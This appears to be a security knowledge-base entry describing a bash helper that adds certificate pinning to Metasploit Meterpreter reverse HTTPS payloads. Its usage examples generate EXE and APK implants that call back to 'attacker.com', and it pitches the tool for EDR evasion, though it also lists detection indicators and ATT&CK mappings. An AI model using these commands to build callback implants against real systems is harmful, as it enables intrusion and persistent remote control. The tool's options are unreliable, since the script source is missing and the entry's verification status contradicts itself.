---
type: tool
description: >-
  A bash script to secure Meterpreter staged or stageless connections by
  implementing certificate validation against the handler, preventing
  unauthorized interception.
url: ''
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - metasploit
  - meterpreter
  - post-exploitation
  - secure-payload
  - certificate-pinning
validated: true
---

# Meterpreter-Paranoid-Mode

**Status**: Unverified

## Overview

Meterpreter_Paranoid_Mode.sh is a helper script for Metasploit Framework users to enhance the security of Meterpreter payloads. It enables certificate checking for HTTPS-based reverse connections, ensuring the payload only connects to a handler with a matching certificate. This is useful in red team operations to mitigate risks from network adversaries or detection systems that might attempt to hijack the C2 channel.

Common use cases include generating tamper-resistant payloads for evading EDR solutions and securing C2 communications in hostile environments.

## Description

The script automates the configuration of Metasploit handlers and payloads with built-in certificate validation. By embedding a certificate hash into the payload, it performs runtime checks against the connecting handler's certificate. If the certificates do not match, the connection is aborted, adding a layer of integrity to the C2 infrastructure. This approach is particularly valuable for staged payloads where initial bootstrap stages are vulnerable to interception.

It integrates seamlessly with msfvenom for payload generation and msfconsole for handler setup, supporting both Windows and Android targets typically.

## Features

- Certificate hash embedding for payload integrity checks
- Automated handler configuration with HTTPS and SSL options
- Support for staged and stageless Meterpreter payloads
- Customizable output formats (EXE, APK, raw shellcode)
- Integration with Metasploit's resource scripts for repeatable setups

## Installation

### Requirements

- Metasploit Framework (full installation)
- OpenSSL for certificate generation
- Bash environment (Kali Linux recommended)

### Install Commands

```bash
# Download the script (assuming from a repository or manual creation)
wget https://example-repo/Meterpreter_Paranoid_Mode.sh -O Meterpreter_Paranoid_Mode.sh
chmod +x Meterpreter_Paranoid_Mode.sh

# Or create manually if source code is available
# (Script content would be pasted here)

# Generate a self-signed certificate for testing
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl x509 -in cert.pem -fingerprint -noout | cut -d'=' -f2 | tr -d ':' > cert_hash.txt
```

## Basic Usage

```bash
./Meterpreter_Paranoid_Mode.sh --help
```

### Common Options

| Option | Description |
|--------|-------------|
| `-h, --help` | Display help message and usage |
| `--setup-handler` | Configure Metasploit handler with cert validation |
| `--generate-payload` | Create payload with embedded cert checks |
| `--cert-path` | Path to certificate file |
| `--cert-hash` | Pre-computed hash of the certificate |
| `--lhost` | Listener host IP/domain |
| `--lport` | Listener port |
| `--format` | Payload output format (exe, apk, etc.) |

## Examples

### Example 1: Basic Usage

Set up a handler and generate a payload:

```bash
# Setup handler
./Meterpreter_Paranoid_Mode.sh --setup-handler --cert-path cert.pem --lhost 192.168.1.100 --lport 8443

# Generate payload
./Meterpreter_Paranoid_Mode.sh --generate-payload --cert-hash $(cat cert_hash.txt) --lhost 192.168.1.100 --lport 8443 --format exe
```

### Example 2: Advanced Usage

For stageless Android payload:

```bash
./Meterpreter_Paranoid_Mode.sh --setup-handler --cert-path cert.pem --lhost attacker.com --lport 443 --ssl
./Meterpreter_Paranoid_Mode.sh --generate-payload --cert-hash $(openssl x509 -in cert.pem -fingerprint -noout | cut -d'=' -f2 | tr -d ':') --lhost attacker.com --lport 443 --format apk --stageless
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Encrypted Channel]] Encrypted Channel: HTTPS (enables secure C2 with cert validation)
- [[Connection Proxy]] Proxy: Multi-hop Proxy (can chain with proxies for obfuscation)
- [[Obfuscated Files or Information]] Obfuscated Files or Information (payloads with embedded checks)

### Tactics

- [[Command and Control]] Command and Control
- [[Execution]] Execution

## Detection

Indicators and methods for detecting this tool's usage:

- Presence of custom Metasploit resource scripts (.rc files) referencing certificate hashes
- Network traffic showing HTTPS Meterpreter beacons with specific User-Agent strings
- File artifacts: self-signed certs or hash files in temporary directories
- Process monitoring: msfvenom or msfconsole invocations with HTTPS payload options
- EDR alerts on certificate validation failures or anomalous C2 connections

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/Metasploit-Framework]]
- [[tools/msfvenom]]
- [[tools/openssl]]

## References

- Metasploit Documentation: https://docs.metasploit.com/
- Encrypted C2 Channels: https://attack.mitre.org/techniques/T1573/
- Custom script repositories (e.g., GitHub searches for Meterpreter paranoid mode)
